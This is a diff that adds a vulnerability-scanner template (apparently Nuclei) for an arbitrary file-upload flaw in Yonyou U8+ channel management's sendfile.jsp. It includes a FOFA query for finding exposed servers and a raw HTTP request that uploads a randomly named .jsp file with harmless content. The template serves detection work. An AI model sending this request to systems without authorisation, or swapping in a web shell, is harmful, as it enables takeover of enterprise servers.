@@ -1,0 +1,44 @@
+id: yonyou-u8-plus-sendfile-fileupload
+info:
+  name: U8+渠道管理(高级版) sendfile.jsp 文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: U8+是用友公司推出的企业管理软件套件，广泛应用于财务、供应链、人力资源等多个业务领域。在U8+渠道管理（高级版）模块中，存在一处文件上传漏洞，位于其 sendfile.jsp 文件中。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上执行任意代码，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/szo1n83gzurt9tgn
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: title="渠道管理（高级版）"
+    hunter-query: demo
+    tips: path in response
+    repair:
+    version:
+  tags: fileupload,yonyou,u8plus
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /business/common/importdata/sendfile.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Content-Length: 124
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+
+        123
+        ------WebKitFormBoundary--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'userfile','default','temp')
+        condition: and
